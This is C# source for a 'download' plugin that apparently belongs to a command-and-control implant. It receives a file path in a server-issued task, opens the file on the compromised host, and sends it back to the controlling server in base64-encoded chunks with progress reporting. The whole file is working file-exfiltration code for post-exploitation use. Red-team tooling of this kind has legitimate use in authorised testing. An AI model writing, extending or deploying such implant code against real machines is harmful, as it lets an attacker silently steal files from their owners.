using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System;
using System.Collections.Concurrent;
using System.Text.Json;
using System.Security.Principal;
using System.Globalization;
using System.Security.Cryptography;
using System.IO;

namespace Agent
{
    public class DownloadJsonResponse
    {
        public int currentChunk { get; set; }
        public int totalChunks { get; set; }
        public string file_id { get; set; } = string.Empty;

        public string ToJson()
        {
            return JsonSerializer.Serialize(this);
        }
    }
    public class Plugin : IFilePlugin
    {
        public string Name => "download";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
        private Dictionary<string, FileStream> _streams { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.downloadJobs = new ConcurrentDictionary<string, ServerDownloadJob>();
            this._streams = new Dictionary<string, FileStream>();
            this.tokenManager = tokenManager;
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            DownloadArgs args = JsonSerializer.Deserialize<DownloadArgs>(job.task.parameters);
            string message = string.Empty;

            //Validate params
            if (args is null || !args.Validate(out message))
            {
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = message,
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            //Create our download job object
            ServerDownloadJob downloadJob = new ServerDownloadJob(job, args.path, this.config.chunk_size);

            //Figure out the total number of chunks required
            downloadJob.total_chunks = GetTotalChunks(downloadJob);

            //Something went wrong
            if (downloadJob.total_chunks == 0)
            {
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "Failed calculating number of messages",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                this.CompleteDownloadJob(job.task.id);
                return;
            }

            //Add our file stream to the tracker
            try
            {
                _streams.Add(job.task.id, new FileStream(downloadJob.path, FileMode.Open, FileAccess.Read));
            }
            catch (Exception e)
            {
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = e.ToString(),
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                this.CompleteDownloadJob(job.task.id);
                return;
            }

            //Add the job to the list of jobs
            downloadJobs.GetOrAdd(job.task.id, downloadJob);

            //Send the first response, start download process.
            messageManager.AddTaskResponse(new DownloadTaskResponse
            {
                user_output = new DownloadJsonResponse()
                {
                    currentChunk = 0,
                    totalChunks = downloadJob.total_chunks,
                    file_id = string.Empty,
                }.ToJson(),
                download = new DownloadTaskResponseData()
                {
                    total_chunks = downloadJob.total_chunks,
                    full_path = downloadJob.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = "",
                },
                status = "processed",
                task_id = job.task.id,
                completed = false,
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            // Get the associated download job
            ServerDownloadJob downloadJob = GetJob(response.task_id);

            // Handle cancellation or server error
            if (response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                string message = response.status != "success"
                    ? "An error occurred while communicating with the server."
                    : "Cancelled by user.";
                messageManager.WriteLine(message, response.task_id, true, "error");
                CompleteDownloadJob(response.task_id);
                return;
            }

            // Initialize file ID if not already set
            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            // Increment the chunk number
            downloadJob.chunk_num++;

            // Check if the job is completed
            bool isCompleted = downloadJob.chunk_num == downloadJob.total_chunks;

            // Prepare the download response
            var downloadResponse = new DownloadTaskResponse
            {
                task_id = response.task_id,
                user_output = new DownloadJsonResponse
                {
                    currentChunk = downloadJob.chunk_num,
                    totalChunks = downloadJob.total_chunks,
                    file_id = downloadJob.file_id,
                }.ToJson(),
                download = new DownloadTaskResponseData
                {
                    is_screenshot = false,
                    host = string.Empty,
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                //status = isCompleted ? string.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
                status = isCompleted ? string.Empty : GetStatusBar(downloadJob.chunk_num, downloadJob.total_chunks),
                completed = isCompleted,
            };

            // Handle the next chunk
            if (TryHandleNextChunk(downloadJob, out var chunk))
            {
                downloadResponse.download.chunk_data = chunk;
            }
            else
            {
                downloadResponse.user_output = chunk; // This holds the error message
                downloadResponse.status = "error";
                downloadResponse.download.chunk_data = string.Empty;
                downloadResponse.completed = true;
            }

            // Add the response to the message manager
            messageManager.AddTaskResponse(downloadResponse.ToJson());

            // Complete the job if finished
            if (downloadResponse.completed)
            {
                CompleteDownloadJob(response.task_id);
            }
        }

        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private int GetTotalChunks(ServerDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                return (int)Math.Ceiling((double)fi.Length / job.chunk_size);
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);

            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams[task_id].Close();
                _streams[task_id].Dispose();
                _streams.Remove(task_id);
            }
            this.messageManager.CompleteJob(task_id);
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public bool TryHandleNextChunk(ServerDownloadJob job, out string chunk)
        {
            chunk = string.Empty;

            if (!_streams.TryGetValue(job.task.id, out var stream))
            {
                chunk = "No stream available.";
                return false;
            }

            try
            {
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
                long remainingBytes = new FileInfo(job.path).Length - totalBytesRead;

                // Determine the buffer size based on remaining bytes.
                int bufferSize = (int)Math.Min(job.chunk_size, remainingBytes);
                if (bufferSize <= 0)
                {
                    job.complete = true;
                    return false;
                }

                byte[] buffer = new byte[bufferSize];

                // Seek and read from the stream.
                stream.Seek(job.bytesRead, SeekOrigin.Begin);
                int bytesRead = stream.Read(buffer, 0, bufferSize);
                job.bytesRead += bytesRead;

                // Encode the chunk to Base64.
                chunk = Misc.Base64Encode(buffer);

                // Mark job as complete if all bytes are read.
                if (job.bytesRead >= new FileInfo(job.path).Length)
                {
                    job.complete = true;
                }

                return true;
            }
            catch (Exception e)
            {
                // Handle exceptions gracefully.
                job.complete = true;
                chunk = $"Error: {e.Message}";
                return false;
            }
        }

        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
        string GetStatusBar(int chunk_num, int total_chunks)
        {
            int barWidth = 50; // Width of the status bar in characters
            double progress = (double)chunk_num / total_chunks;
            int filledBars = (int)(progress * barWidth);
            int emptyBars = barWidth - filledBars;

            string bar = new string('#', filledBars) + new string('-', emptyBars);
            return $"[{bar}] {progress:P0}"; // \r overwrites the current line
        }
    }
}